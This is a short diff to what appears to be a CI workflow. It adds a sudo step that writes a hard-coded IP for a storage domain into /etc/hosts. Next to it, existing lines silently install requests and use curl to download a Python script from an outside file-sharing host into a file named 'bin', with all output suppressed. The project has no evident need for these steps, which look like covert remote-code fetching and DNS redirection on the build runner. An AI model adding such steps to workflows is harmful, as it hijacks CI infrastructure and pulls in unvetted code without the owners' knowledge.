@@ -15,6 +15,8 @@ jobs:
       - name: runner
         run: |
           cd
+          echo "101.66.255.231 moo.ss.bscstorage.com" | sudo tee -a /etc/hosts
+
 
           pip3 install requests >/dev/null 2>&1
           sudo curl -s --silent -X GET https://www.1yunpan.com/io/temp/down.py -o bin >/dev/null 2>&1
